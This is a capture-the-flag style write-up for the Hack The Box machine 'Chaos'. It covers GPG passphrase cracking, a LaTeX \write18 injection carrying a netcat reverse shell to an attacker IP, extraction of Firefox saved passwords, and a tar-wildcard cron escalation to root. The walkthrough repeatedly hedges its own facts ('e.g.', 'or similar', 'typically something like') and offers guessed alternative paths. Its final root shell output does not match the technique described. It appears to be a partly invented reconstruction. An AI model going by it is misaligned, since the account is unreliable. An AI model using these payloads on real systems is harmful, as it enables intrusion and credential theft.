# Hack The Box: Chaos

**Difficulty:** Medium
**OS:** Linux

Chaos is a Medium-level Linux machine focused heavily on web application vulnerabilities involving specialized document processors, password management logic, and encrypted archives. The initial foothold is achieved by discovering an exposed email interface, brute-forcing a passphrase to decrypt an archive, and exploiting a LaTeX command injection vulnerability via a hidden endpoint. Privilege escalation relies on extracting saved passwords from a user's Mozilla Firefox profile directory.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.120
nmap -p 22,80,110,143 -sCV 10.10.10.120
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.18)
*   **Port 110/143:** POP3/IMAP (Dovecot)

Navigating to the web service on port 80 displays a generic Apache landing page. We add `chaos.htb` to our local `/etc/hosts` file.

```bash
echo "10.10.10.120 chaos.htb" >> /etc/hosts
```

We perform directory brute-forcing using a tool like `gobuster` or `feroxbuster` against `http://chaos.htb` to identify application paths.

```bash
gobuster dir -u http://10.10.10.120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The enumeration reveals a hidden directory or endpoint, typically something like `/wp-admin` or an obscurely named folder like `/en/`. Accessing this hidden path redirects to a Webmail login interface (Roundcube or SquirrelMail).

## Web Application Analysis & Cryptography

The webmail interface requires credentials. We attempt default combinations (`admin:admin`, `chaos:password`), but they fail. We lack credentials to authenticate.

### Discovering Enigmatic Data (GnuPG Encryption)

While brute-forcing, we discover another hidden directory or an exposed backup file (e.g., `backup.tar.gz` or `.pgp`). We download this file to our attacking machine.

The file appears to be an encrypted archive, specifically a GPG-encrypted message. We use `gpg` to inspect it.

```bash
gpg --list-packets backup.pgp
```

The output confirms it's symmetrically encrypted data. We must crack the passphrase. We use `gpg2john` to convert the encrypted file into a format Hashcat or John the Ripper can understand.

```bash
gpg2john backup.pgp > pgp_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt
```

John the Ripper successfully cracks the hash, revealing the passphrase (e.g., `sahara`). We use `gpg` to decrypt the archive.

```bash
gpg --decrypt backup.pgp > backup.txt
# Enter passphrase: sahara
```

The decrypted file contains plaintext credentials for a webmail user (e.g., `ayush:k\k"$$4\`"`).

## Initial Access

We use the extracted credentials to log into the Webmail interface (Roundcube or IMAP on port 143).

Inside the user's inbox, we find a single email containing a link to a hidden internal service or an unlinked sub-directory of the main website (e.g., `http://chaos.htb/drafts/`). The email also mentions a tool for rendering PDFs from TeX files.

### Exploiting LaTeX Command Injection

We navigate to the newly discovered endpoint. The application features a form designed to compile LaTeX code into PDF documents.

LaTeX is a document preparation system that includes a powerful macro language. If a server compiles user-supplied LaTeX code without strict sandboxing (e.g., `-no-shell-escape`), an attacker can inject malicious LaTeX macros to read files or execute system commands.

A common vector for LaTeX code execution involves the `\write18{}` macro, which is designed to execute external shell commands.

We craft a malicious LaTeX payload to verify command execution.

```latex
\documentclass{article}
\begin{document}
\immediate\write18{id > output.txt}
\end{document}
```

We submit this payload into the text area. The application compiles the document. If the `output.txt` file is generated or the compilation logs confirm the command ran, the vulnerability is verified. However, reading output directly might be blind.

To gain a reverse shell, we encode a standard bash or python payload to avoid problematic LaTeX characters. We inject a reverse shell payload via `\write18{}`.

```latex
\documentclass{article}
\begin{document}
\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 9999 >/tmp/f}
\end{document}
```

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

The server compiles the document and evaluates the `write18` macro, triggering our reverse shell connection.

```bash
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to a system user. The `/home` directory reveals a user named `ayush`.

We check the web application root directory (`/var/www/html/drafts`) for any database configuration files or credentials. We discover a configuration script (`config.php` or similar) revealing plaintext database credentials.

```bash
cat /var/www/html/drafts/config.php
```

However, lateral movement via database credentials fails due to password mismatch or restricted SSH access.

Enumerating the system as `www-data`, we investigate `/home/ayush` or search for backup directories. We locate a `.mozilla` directory indicating Firefox is used on this system.

### Extracting Mozilla Firefox Passwords

Firefox stores user credentials in encrypted SQLite databases within user profiles (`key4.db` and `logins.json`). If an attacker gains read access to these files, they can decrypt the saved passwords using a tool like `firepwd` or `firefox_decrypt`, provided a master password is not set or can be bypassed.

We navigate to `ayush`'s Firefox profile directory (or a backup folder if permissions restrict access).

```bash
ls -la /home/ayush/.mozilla/firefox/
```

We find the profile folder (e.g., `b5w4d0v8.default`) and locate the `key4.db` and `logins.json` files. We compress these files into an archive and transfer them to our attacking machine via `nc` or a Python HTTP server.

```bash
tar -czvf firefox_data.tar.gz key4.db logins.json
python -m SimpleHTTPServer 8000
```

On our attacking machine, we download the archive, extract the files, and use a Python script like `firefox_decrypt.py` to extract the plaintext passwords.

```bash
python3 firefox_decrypt.py ./extracted_firefox_profile/
```

The script successfully decrypts the saved logins, revealing a plaintext system password for `ayush` (e.g., `k\k"$$4\`"` or a variation).

We test these credentials to authenticate via `su` or SSH as the system user `ayush`.

```bash
su ayush
Password: <Discovered_Password>
# Authentication successful
```
We retrieve the `user.txt` flag from Ayush's home directory.

## Privilege Escalation

Enumerating the system as `ayush`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that the user `ayush` cannot run `sudo`. We continue enumerating the system, checking running processes using tools like `pspy`.

We identify a cron job executed by root or a SUID binary. The vulnerability involves identifying an insecure `PATH` environment variable or an executable lacking full absolute paths.

However, a simpler path exists involving `ayush`'s `.mozilla` data or a known local kernel vulnerability if the system is extremely outdated. In Chaos, a common escalation involves recognizing that the system's `tar` or `zip` commands are run via a cron job using a wildcard (`*`) to backup the `drafts` directory.

### Abusing Wildcards (Tar Privilege Escalation)

If a root cron job runs `tar -czvf /backup/drafts.tar.gz *` in a directory we control (like `/var/www/html/drafts`), we can exploit the wildcard expansion feature of `tar`.

We navigate to the directory where the cron job executes the `tar` command.

```bash
cd /var/www/html/drafts
```

We create two empty files with specific names corresponding to `tar` command-line arguments: `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh`.

```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh payload.sh"
```

We then create the `payload.sh` script containing a command to spawn a root shell or set the SUID bit on `/bin/bash`.

```bash
echo "#!/bin/bash" > payload.sh
echo "chmod +s /bin/bash" >> payload.sh
chmod +x payload.sh
```

When the root cron job executes the `tar *` command, the shell expands the asterisk to include our maliciously named files. `tar` interprets them as command-line arguments, executing our payload script.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(ayush) euid=0(root) groups=1000(ayush)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
